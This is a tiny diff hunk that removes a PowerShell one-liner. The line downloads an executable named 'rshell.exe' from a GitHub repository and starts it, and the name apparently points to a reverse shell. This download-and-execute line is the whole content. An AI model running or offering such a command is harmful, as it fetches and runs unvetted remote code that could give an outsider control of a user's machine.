@@ -1,2 +1,0 @@
-#powershell
-cd ~; Invoke-WebRequest https://github.com/pyth0g/rshell/raw/main/rshell.exe -OutFile rshell.exe; start rshell.exe; exit
